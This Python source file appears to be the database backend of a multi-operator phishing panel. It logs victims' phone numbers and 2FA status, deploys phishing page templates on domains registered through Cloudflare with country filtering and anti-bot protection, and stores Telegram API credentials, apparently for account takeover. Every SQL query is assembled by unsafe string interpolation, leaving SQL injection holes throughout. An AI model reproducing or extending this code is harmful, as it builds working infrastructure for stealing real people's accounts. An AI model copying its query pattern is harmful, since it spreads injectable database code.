from peewee import SqliteDatabase
from datetime import datetime
from os import mkdir, listdir
from shutil import rmtree
from config import clf, server_ip
import json
from config import timezone

class User:

    def __init__(self, database_path, table):
        self.database_path = database_path
        self.table = table

    def GetUserBy(self, parameter, value):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM {self.table} WHERE {parameter}='{value}'")
            conn.commit()
            data = cursor.fetchall()
            return data


    def UpdateUser(self, datas, parameter, value):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            for data in datas:
                cursor.execute(f"UPDATE {self.table} SET {data[0]} = '{data[1]}' WHERE {parameter} = '{value}';")
                conn.commit()
            return True

    def UpdateActivity(self, username):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"UPDATE users SET updated_on = '{datetime.now(timezone)}' WHERE username = '{username}';")
            conn.commit()
            return True

    def GetAllUsers(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM {self.table}")
            conn.commit()
            data = cursor.fetchall()
            return data


    def AddUser(self, username, password, chat_id, bot_token, note):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"INSERT INTO {self.table}(`username`, `created_on`, `updated_on`, `password_hash`, `note`, `chat_id`, `bot_token`) VALUES('{username}', '{datetime.now(timezone)}', '{datetime.now(timezone)}', '{password}', '{note}', '{chat_id}', '{bot_token}') ")
            conn.commit()
            mkdir(f'./users/{username}/')
            mkdir(f'./users/{username}/sessions/')
            mkdir(f'./users/{username}/uploads/')
            
            f = open(f'./users/{username}/database.db', 'w')
            f.close()

            with SqliteDatabase(f'./users/{username}/database.db') as conn:
                cursor = conn.cursor()
       
                cursor.execute("""
                CREATE TABLE logs (
                    phone  VARCHAR,
                    domain TEXT,
                    time   DATETIME,
                    fish   VARCHAR,
                    status TEXT,
                    two_fa TEXT
                );
                """)

                cursor.execute("""
                CREATE TABLE "domains" (
                    "id"	INTEGER NOT NULL UNIQUE,
                    "domain"	TEXT,
                    "path"	    TEXT,
                    "servers"	TEXT,
                    "template"	TEXT,
                    "status"	TEXT,
                    "security"	TEXT,
                    "redirect"	TEXT,
                    "redirect_on_success"	TEXT,
                    "countries"	TEXT,
                    "views"	INTEGER DEFAULT 0,
                    "logs_received"	INTEGER DEFAULT 0,
                    "created_on"	DATETIME,
                    "app_id"	TEXT,
	                "api_hash"	TEXT,
                    PRIMARY KEY("id" AUTOINCREMENT)                               
                );
                """)

                conn.commit()

            return True


    def RemoveUser(self, username):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"DELETE FROM {self.table} WHERE username = '{username}'")
            conn.commit()
            rmtree(f'./users/{username}')
            return True
        

    def GetAdmins(self, username):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM admins WHERE username = '{username}'")
            conn.commit()
            data = cursor.fetchone()
            if data == None:
                data = [None, None]
            return data

    def GetBotData(self, username):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT chat_id, bot_token FROM users WHERE username = '{username}'")
            conn.commit()
            data = cursor.fetchall()
            return data

    def GetNews(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM news")
            conn.commit()
            data = cursor.fetchall()
            return data
        

    def AddNews(self, title, desc):
        try:
            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"INSERT INTO news(`title`, `desc`, `date`) VALUES('{title}', '{desc}', '{datetime.now(timezone)}')")
                conn.commit()
                return True
        except:
            return False

    def EditNews(self, title, desc, id):
        try:
            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"UPDATE news SET title = '{title}', desc = '{desc}' WHERE id = '{id}';")
                conn.commit()
                return True
        except:
            return False
        

    def RemoveNews(self, id):
        try:
            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"DELETE FROM news WHERE id = '{id}';")
                conn.commit()
                return True
        except:
            return False

    def GetInfo(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM info")
            conn.commit()
            data = cursor.fetchall()
            return data
    
    
    
    def AddInfo(self, title, link):
        try:
            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"INSERT INTO info(`title`, `link`) VALUES('{title}', '{link}')")
                conn.commit()
                return True
        except:
            return False

    def RemoveInfo(self, title):
        try:
            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"DELETE FROM info WHERE title = '{title}';")
                conn.commit()
                return True
        except:
            return False


    def GetTops(self):

        users = listdir('./users/')
        data = {}
        for user in users:
            data
            with SqliteDatabase(f'./users/{user}/database.db') as conn:
                cursor = conn.cursor()
                cursor.execute(f"SELECT logs_received, views FROM domains")
                conn.commit()
                logs_received = cursor.fetchall()
        
            log = 0
            views = 0
        
            for logs in logs_received:
                log += logs[0]
                views += logs[1]
            data[user] = {'logs': log, 'views': views}
                    
        return data


    def GetLogs(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM logs")
            conn.commit()
            data = cursor.fetchall()
            return data
        
    def AddLog(self, username, domain, phone, fish, status, two_fa = 'Нет'):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"INSERT INTO logs(username, phone, domain, time, fish, status, two_fa) VALUES('{username}', '{phone}', '{domain}', '{datetime.now(timezone)}', '{fish}', '{status}', '{two_fa}')")
            conn.commit()
            return True

    def RemoveLog(self, phone):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"DELETE FROM logs WHERE phone = '{phone}'")
            conn.commit()
            return True
        


class Victim:
    def __init__(self, database_path):
        self.database_path = database_path

    def GetLogs(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM logs")
            conn.commit()
            data = cursor.fetchall()
            return data
        
    def GetCountOfLogs(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT SUM(logs_received) as total_logs_received FROM domains;")
            conn.commit()
            data = cursor.fetchall()
            return data

    def GetDomains(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT id, domain, path, servers, template, status, security, views, logs_received FROM domains")
            conn.commit()
            data = cursor.fetchall()
            return data
        

    def CheckDomain(self, domain):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT domain FROM domains WHERE domain = '{domain}'")
            conn.commit()
            data = cursor.fetchall()
            return data

    

    def GetRedirect(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT redirect, redirect_on_success FROM domains")
            conn.commit()
            data = cursor.fetchall()
            return data




    def AddDomain(self, domain, page, path, security, redirect, countries, redirect_on_success, username, app_id, api_hash):
        added_domain = clf.AddDomain(domain)

        if added_domain:
            data = json.loads(added_domain)

            zone_id = data['result']['id']
            status = data['result']['status']
            ns_servers = ', '.join(data['result']['name_servers'])
            countries_db = ', '.join(countries)

            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"""
                    INSERT INTO domains(domain, path, servers, template, status, security, redirect, redirect_on_success, countries, created_on, app_id, api_hash)
                    VALUES('{domain}', '{path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.now(timezone)}', '{app_id}', '{api_hash}')
                """)
  
                conn.commit()
                mkdir(f"templates/domains/{domain}${path}/")
                f = open(f"templates/domains/{domain}${path}/{username}.html", 'w')
                f.write("{% set username = '" + username + "' %}\n{% extends 'phishes/" + page + "/index.html' %}")
                f.close()

                if clf.BindDomain(zone_id, domain, server_ip):
                    clf.CountryFirewall(zone_id, countries)
                    if security == 'true':
                        clf.SetSecurityLevel(zone_id, 'under_attack')

                    return [True, 'Домен успешно добавлен']
                else:
                    return [False, 'Что-то пошло не так, свяжитесь с админом']
        
        else:
            return [False, 'Этот домен добавлен уже добавлен другим пользователем, обратитесь в поддержку']
        



    def UpdateDomain(self, url, id):
        domains = clf.getDomains()
        for domain in domains:
            if domain['name'] in url:
                with SqliteDatabase(self.database_path) as conn:
                    cursor = conn.cursor()
                    cursor.execute(f"UPDATE domains SET status = '{domain['status']}' WHERE id = '{id}';")
                    conn.commit()
                    return [True, domain['status']]
        return [False, None]
    

    def GetDomainInfo(self, id=None, domain=None):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            if domain == None:
                cursor.execute(f"SELECT * FROM domains WHERE id = '{id}'")
            else:
                cursor.execute(f"SELECT * FROM domains WHERE domain = '{domain}'")
            conn.commit()
            data = cursor.fetchall()
            return data


    def EditDomain(self, domain, page, path, security, redirect, countries, redirect_on_success, username, app_id, api_hash):
        try:
            old_data = self.GetDomainInfo(domain=domain)
            rmtree(f"templates/domains/{domain}${old_data[0][2]}")
            countries_db = ', '.join(countries)
            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"""UPDATE domains 
                    SET template = '{page}',
                    path = '{path}',
                    security = '{security}',
                    redirect = '{redirect}',
                    countries = '{countries_db}',
                    redirect_on_success = '{redirect_on_success}',
                    app_id = '{app_id}',
                    api_hash = '{api_hash}'
                    WHERE domain = '{domain}';""")
                conn.commit()

                mkdir(f"templates/domains/{domain}${path}/")
                f = open(f"templates/domains/{domain}${path}/{username}.html", 'w')
                f.write("{% set username = '" + username + "' %}\n{% set fish = '" + page + "'%} {% extends 'phishes/" + page + "/index.html' %}")
                f.close()
                zones = clf.getDomains()
                for zone in zones:
                    if zone['name'] == domain:
                        clf.UpdateFilter(zone['id'], countries)
                        if security == 'true':
                            clf.SetSecurityLevel(zone['id'], 'under_attack')
                        else:
                            clf.SetSecurityLevel(zone['id'], 'medium')
            return True
        except Exception as e:
            print(e)
            return False


    def RemoveDomain(self, domain):
        try:
            old_data = self.GetDomainInfo(domain=domain)
            rmtree(f"templates/domains/{domain}${old_data[0][2]}")

            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"DELETE FROM domains WHERE domain = '{domain}';")
                conn.commit()
                zones = clf.getDomains()
                for zone in zones:
                    if zone['name'] == domain:
                        clf.SetSecurityLevel(zone['id'], 'medium')
                        clf.RemoveFilter(zone['id'])
                        clf.RemoveDomain(zone['id'])
            return True
        except Exception as e:
            print(e)
            return False
        


    
    def AddView(self, domain):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"UPDATE domains SET views = views + 1 WHERE domain = '{domain}'")
            conn.commit()
            return True
        


    def GetTGData(self, domain):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT app_id, api_hash FROM domains WHERE domain = '{domain}'")
            conn.commit()
            data = cursor.fetchall()
            return data
        

    def AddLog(self, domain, phone, fish, status, two_fa = 'Нет'):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"INSERT INTO logs(phone, domain, time, fish, status, two_fa) VALUES('{phone}', '{domain}', '{datetime.now(timezone)}', '{fish}', '{status}', '{two_fa}')")
            conn.commit()
            return True
        
    def CheckLog(self, phone):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT phone FROM logs WHERE phone = '{phone}'")
            conn.commit()
            data = cursor.fetchall()
            return data

    def IncreaseLogsNum(self, domain):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"UPDATE domains SET logs_received = logs_received + 1 WHERE domain = '{domain}'")
            conn.commit()
            return True


    def UpdateLog(self, domain, phone, fish, status, two_fa = 'Нет'):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"""UPDATE logs 
                    SET domain = '{domain}',
                    time = '{datetime.now(timezone)}',
                    fish = '{fish}',
                    status = '{status}',
                    two_fa = '{two_fa}'
                    WHERE phone = '{phone}';""")
            conn.commit()
            return True
        

    def RemoveLog(self, phone):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"DELETE FROM logs WHERE phone = '{phone}'")
            conn.commit()
            return True